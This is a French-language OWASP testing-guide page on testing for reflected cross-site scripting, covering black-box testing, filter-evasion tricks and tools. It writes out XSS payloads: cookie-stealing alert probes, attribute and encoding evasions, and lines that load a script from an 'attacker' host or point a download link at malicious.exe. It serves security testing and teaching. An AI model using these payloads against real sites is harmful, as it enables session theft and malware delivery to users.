## Sommaire

Les attaques Reflected [Cross-site Scripting
(XSS)](Cross-site_Scripting_\(XSS\) "wikilink") ont lieu quand un
attaquant injecte du code exécutable par le navigateur dans une seule
réponse HTTP. L'attaque injectée n'est pas stockée par l'application
elle-même ; elle est non-persistante et n'impacte que les utilisateurs
qui ouvrent un lien malicieux ou une page web tierce. La chaîne
d'attaque est incluse dans l'URI ou les paramètres HTTP, est mal
interprêtée par l'application, puis renvoyée à la victime.

Les Reflected XSS sont le type d'attaques XSS que l'on trouve le plus
fréquemment. Elles sont aussi connues sous le nom d'attaques
non-persistantes, puisque la charge utile de l'attaque est envoyée et
exécutée par une simple requête/réponse. Elles sont aussi appelées
attaque XSS de premier ordre ou de type 1.

Quand une application est vulnérable à ce type d'attaque, elle va passer
des entrées non-validées de requêtes à un client. Le modus operandi
classique inclut une étape de design, lors de laquelle l'attaquant crée
et teste une URI hostile, puis une étape d'ingénierie sociale lors de
laquelle l'attaquant convainc ses victimes de charger cette URI dans
leur navigateur, et enfin l'exécution du code par le navigateur de la
victime.

Généralement le code de l'attaquant est écrit en JavaScript, mais
d'autres langages peuvent être utilisés, par exemple ActionScript et
VBScript. Les attaquants utilisent ces vulnérabilités pour installer des
key loggers, voler les cookies des victimes, voler le contenu du
presse-papier ou encore changer le contenu d'une page (par exemple les
liens de téléchargement).

Une des principales difficultés pour prévenir les vulnérabilités XSS
vient de l'encodage des caractères. Dans certains cas, les serveurs web
ou les application web ne peuvent pas filtrer certains encodages, par
exemple l'application web va filtrer "

<script>

" mais peut-être pas %3cscript%3e, qui encode différemment les
marqueurs.

## Comment tester

### Test en boite noire

Un test en boite noire va comprendre au moins trois phases :

1\. Détecter les vecteurs d'entrée. Pour chaque page web, le testeur
doit déterminer toutes les variables utilisateur définies par
l'application et comment les entrer. Cela inclut les entrées cachées et
non évidentes, comme les paramètres HTTP, les données POST, les champs
cachés dans les formulaires, et les valeurs prédéfinies de radio et
sélections. Typiquement, les éditeurs HTML des navigateurs ou des
proxies web seront utilisés pour visualiser ces variables cachées. Voir
les exemples ci-dessous.

2\. Analyser chaque vecteur d'entrée pour détecter des vulnérabilités
potentielles. Pour détecter une vulnérabilité XSS, le testeur utilise
généralement des données d'entrée spécialement conçues pour chaque
vecteur. De telles données d'entrée sont généralement inoffensives, mais
déclenchent des réponses de la part du navigateur web qui mettent en
évidence la vulnérabilité. Les données de test peuvent être générées
grâce à un fuzzer d'application web, une liste prédéfinie de chaînes
d'attaque automatisée ou manuellement.
Quelques exemples d'attaques :

    <script>alert(123)</script>

    “><script>alert(document.cookie)</script>

Pour une liste complète des chaînes à tester, voir [XSS Filter Evasion
Cheat Sheet](XSS_Filter_Evasion_Cheat_Sheet "wikilink").

3\. Pour chaque test de la phase précédente, le testeur va analyser le
résultat et déterminer s'il représente une vulnérabilité ayant un
impact réel sur la sécurité de l'application web. Cela implique
d'examiner la page HTML résultante et d'y chercher l'entrée de test. Une
fois trouvée, le testeur doit identifier les caractères spéciaux qui ne
sont pas correctement encodés, remplacés ou filtrés. L'ensemble
constitué par les caractères spéciaux non filtrés va dépendre du
contexte de cette section HTML.

Idéalement, tous les caractères spéciaux HTML vont être remplacés par
des entités HTML. Les plus importants à identifier sont :

    > (plus grand que)
    < (plus petit que)
    & (et commercial)
    ' (apostrophe or simple quote)
    " (guillemets ou double quote)

Cependant, une liste complète est donnée dans les spécifications HTML et
XML. Wikipedia en donne une référence complète
[1](http://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).

Dans un contexte d'action HTML ou de code JavaScript, un ensemble
différent de caractères spéciaux doit être encodé, remplacé ou filtré.
Cela inclut :

    \n (nouvelle ligne)
    \r (retour chariot)
    \' (apostrophe ou simple quote)
    \" (guillemets ou double quote)
    \\ (backslash)
    \uXXXX (valeurs unicode)

Pour une référence plus complète, voir le guide JavaScript de Mozilla.
[2](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings)

#### Exemple 1

Par exemple, considérons un site qui a une notice de bienvenue "
Bienvenue %username% " et un lien de téléchargement.

![Image:XSS Example1.png](XSS_Example1.png "Image:XSS Example1.png")

Le testeur doit soupçonner que chaque point d'entrée de données peut
servir à une attaque XSS. Pour l'analyser, il va jouer avec la variable
utilisateur et essayer de déclencher la vulnérabilité.

Cliquons sur le lien suivant et voyons ce qui se passe :

    http://example.com/index.php?user=<script>alert(123)</script>

Si aucun nettoyage n'est fait, la popup suivante va s'afficher :

![Image:alert.png](alert.png "Image:alert.png")

Cela indique qu'il y a une vulnérabilité XSS et que le testeur peut
exécuter du code de son choix dans le navigateur de quiconque cliquera
sur le lien du testeur.

#### Exemple 2

Essayons un autre morceau de code (link) :

    http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");
    AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>

Cela produit le comportement suivant :

![Image:XSS Example2.png](XSS_Example2.png "Image:XSS Example2.png")

L'utilisateur cliquant sur le lien fournit par le testeur va télécharger
le fichier malicious.exe depuis le site sous contrôle.

### Contourner les filtres XSS

La prévention des reflected cross-site scripting passe par la validation
des entrées par l'application web, le blocage des entrées malicieuses
par un firewall applicatif, ou par des mécanismes inclus dans les
navigateurs modernes. Le testeur doit considérer que le navigateur
n'empêchera pas l'attaque. Les navigateurs peuvent être obsolètes, ou
avoir leurs fonctions de sécurité désactivées. De même, les firewalls
applicatifs n'offrent aucune garantie pour les attaques nouvelles et
inconnues. Un attaquant peut concevoir une chaîne d'attaque qui ne sera
pas reconnue par le firewall applicatif.

Ainsi, la plus grande part de la prévention des XSS dépend de la
validation des entrées utilisateur. Il y a divers mécanismes à
disposition des développeurs, comme le renvoi d'erreur, la suppression,
l'encodage ou le remplacement des entrées invalides. Les moyens par
lesquels l'application détecte et corrige les entrées invalides sont
aussi une des principales faiblesses pour la prévention des XSS. Une
liste noire ne comprendra pas toutes les chaînes d'attaque possibles,
une liste blanche peut être trop permissive, la correction pourrait
échouer, ou une type d'entrée pourrait être incorrectement accepté et
rester sans correction. Tout cela peut permettre aux attaquants de
contourner les filtres XSS.

La [XSS Filter Evasion Cheat
Sheet](XSS_Filter_Evasion_Cheat_Sheet "wikilink") documente les tests
d'évasion.

#### Exemple 3: Valeur d'attribut de marqueur


Ces filtres sont basés sur une liste noire, ils ne peuvent donc pas
bloquer tous les types d'expressions. En fait, il y a des cas où un
exploit XSS peut être utilisé sans usage du marqueur

<script>

et même sans les caractères comme " \< \> et / qui sont communément
filtrés.

Par exemple, l'application web peut utiliser l'entrée utilisateur pour
renseigner un attribut, comme montré ici :

    <input type="text" name="state" value="INPUT_FROM_USER">

Alors un attaquant peut soumettre le code suivant ;

    " onfocus="alert(document.cookie)

#### Exemple 4: syntaxe ou encodage différent


Dans certains cas, il est possible que les filtres basés sur des
signatures soient trompés en masquant une attaque, typiquement en
insérant des variations inattendues dans la syntaxe ou l'encodage. Ces
variations sont tolérées par les navigateurs comme du code HTML valide
lorsqu'elles sont retournées, et pourtant elles sont aussi acceptées par
le filtre.

Quelques exemples:

    "><script >alert(document.cookie)</script >

    "><ScRiPt>alert(document.cookie)</ScRiPt>

    "%3cscript%3ealert(document.cookie)%3c/script%3e

#### Exemple 5: Contourner le filtrage non-récursif


Parfois, le nettoyage n'est appliqué qu'une fois, au lieu de l'être
récursivement. Dans ce cas, l'attaquant peut vaincre le filtre en
envoyant une chaîne contenant de multiples tentatives, telle que :

    <scr<script>ipt>alert(document.cookie)</script>

#### Exemple 6: Inclure un script externe


Supposons maintenant que les développeurs du site cible ont implémenté
le code suivant, pour protéger les entrées contre l'inclusion de script
externe :

    <?
       $re = "/<script[^>]+src/i";

       if (preg_match($re, $_GET['var']))
       {
          echo "Filtered";
          return;
       }
       echo "Welcome ".$_GET['var']." !";
    ?>

Dans ce scénario, il y a une expression rationnelle qui vérifie si
<b>\<script \[caractère quelconque sauf: '\>' \] src</b> est insérée.
Cela fonctionne pour filtrer des expressions telles que

    <script src="http://attacker/xss.js"></script>

qui est une attaque commune. Mais dans ce cas, il est possible de
contourner la validation en utilisant le caractère "\>" dans un attribut
entre script et src, comme cela :

    http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>

Cela va exploiter la faille cross-site scripting montrée plus haut, en
exécutant le code JavaScript stocké sur le serveur web de l'attaquant,
comme s'il venait du site web victime, <http://example/>.

#### Exemple 7: Pollution des paramètres HTTP (HPP)


La pollution de paramètres HTTP est une autre méthode de contournement
des filtres. Cette technique a été présentée par Stefano di Paola et
Luca Carettoni en 2009 à la conférence OWASP de Pologne. Pour plus
d'informations : [Testing for HTTP Parameter
pollution](Testing_for_HTTP_Parameter_pollution_\(OTG-INPVAL-004\) "wikilink").
Cette technique d'évasion consiste en divisant un vecteur d'attaque en
plusieurs paramètres de même nom. La manipulation de la valeur de chaque
paramètre dépend de chaque technologue web utilisée pour les parser, ce
type d'évasion n'est donc pas toujours possible. Si l'environnement
testé concatène les valeurs de tous les paramètres de même nom, alors
un attaquant peut utiliser cette technique pour contourner les
mécanismes de sécurités basés sur la reconnaissance de motifs.
Attaque classique :

    http://example/page.php?param=<script>[...]</script>

Attaque HPP:

    http://example/page.php?param=<script&param=>[...]</&param=script>

''' Résultat attendu '''
Pour une liste plus détaillée des techniques d'évasion de filtrage :
[XSS Filter Evasion Cheat
Sheet](XSS_Filter_Evasion_Cheat_Sheet "wikilink"). L'analyse des
réponses peut devenir complexe. Une méthode simple peut être d'utiliser
du code qui génère un dialogue popup, comme dans notre exemple. Cela
indique typiquement qu'un attaquant peut exécuter du code JavaScript
arbitraire dans le navigateur des visiteurs.

### Test en boite grise

Le teste en boite grise sera similaire au test en boite noire. En boite
grise, le testeur un connaissance partielle de l'application. Dans ce
cas, les informations concernant les entrées utilisateur, le contrôle
des entrées, et la manière dont les entrées utilisateur sont renvoyées
peuvent être connues par le testeur.

Si le code source est disponible (boite blanche), toutes les variables
reçues des utilisateurs doivent être analysées. Le testeur doit en outre
analyser toute les procédures de validation implémentées pour déterminer
celles qui sont contournables.

## Outils

  - **[OWASP CAL9000](OWASP_CAL9000_Project "wikilink")**

CAL9000 est une collection d'outils de test de sécurité pour les
application web qui complète les proxies et scanner automatiques. Il est
disponible ici : <http://yehg.net/lab/pr0js/pentest/CAL9000/> .

  - **PHP Charset Encoder(PCE)** - <http://h4k.in/encoding> \[mirror:
    <http://yehg.net/e> \]

Cet outil permet d'encoder et de décoder des textes dans 65 types de
caractères. Il fournit aussi quelques fonction d'encodage JavaScript.

  - **HackVertor** -
    <http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php>

Cet outil fournit des douzaines d'encodages flexibles pour des
manipulations avancées de chaînes d'attaques.

  - **[WebScarab](OWASP_WebScarab_Project "wikilink")**

WebScarab est un framework pour l'analyse d'applications HTTP/HTTPS.

  - **XSS-Proxy** - <http://xss-proxy.sourceforge.net/>

XSS-Proxy est un outil avancé d'attaque XSS

  - **ratproxy** - <http://code.google.com/p/ratproxy/>

Outil semi-automatisé, essentiellement passif d'audit de sécurité web.
Il est optimisé pour une détection précise et une annotation automatique
des problèmes potentiels, se basant sur des design patterns observés
dans le trafic utilisateur des environnements web 2.0.

  - **Burp Proxy** - <http://portswigger.net/proxy/>

Burp Proxy est un proxy HTTP/S interactif pour l'attaque et le test
d'applications web.

  - **OWASP Zed Attack Proxy (ZAP)** -
    [OWASP_Zed_Attack_Proxy_Project](OWASP_Zed_Attack_Proxy_Project "wikilink")

ZAP est un outil de test d'intrusion intégré pour trouver des
vulnérabilités dans les applications web. Il est conçu pour être
utilisé par des personnes ayant une large expérience en sécurité, et
est donc idéal pour les développeurs et testeurs fonctionnels débutants
en matière de tests d'intrusion. ZAP fournit des scanners automatiques
aussi bien qu'un ensemble d'outils pour la recherche manuelle.

  - **OWASP Xenotix XSS Exploit Framework** -
    [OWASP_Xenotix_XSS_Exploit_Framework](OWASP_Xenotix_XSS_Exploit_Framework "wikilink")

OWASP Xenotix XSS Exploit Framework est un framework avancé de détection
et exploitation de faille XSS. Il fournit des résultats sans faux
positifs grâce à son scanner triple navigateur (Trident, WebKit, Gecko).
Il prétend inclure la 2nde plus grand base de charges utiles XSS du
monde, pour une détection et un contournement des WAF efficaces. Son
moteur de script permet de créer des cas de tests spécifiques et des
ajouts via son API. Il inclut un module de reconnaissance très riche en
fonctionnalités. Le framework d'exploitation inclut des modules XSS
offsensifs pour les tests d'intrusion et la création de preuves de
concept.

## References

**OWASP Resources**
\*[XSS Filter Evasion Cheat
Sheet](XSS_Filter_Evasion_Cheat_Sheet "wikilink") **Books**
\* Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web
Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0

  - Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook -
    Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN
    978-0-470-17077-9
  - Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov,
    Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS
    Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3

**Whitepapers**
\* **CERT** - Malicious HTML Tags Embedded in Client Web Requests:
[Read](http://www.cert.org/advisories/CA-2000-02.html)

  - **Rsnake** - XSS Cheat Sheet: [Read](http://ha.ckers.org/xss.html)
  - **cgisecurity.com** - The Cross Site Scripting FAQ:
    [Read](http://www.cgisecurity.com/articles/xss-faq.shtml)
  - **G.Ollmann** - HTML Code Injection and Cross-site scripting:
    [Read](http://www.technicalinfo.net/papers/CSS.html)
  - **A. Calvo, D.Tiscornia** - alert('A javascritp agent'):
    [Read](http://corelabs.coresecurity.com/index.php?module=FrontEndMod&action=view&type=publication&name=alert%28A_javascritp_agent%29)
    ( To be published )
  - **S. Frei, T. Dübendorfer, G. Ollmann, M. May** - Understanding the
    Web browser threat:
    [Read](http://www.techzoom.net/publications/insecurity-iceberg/index.en)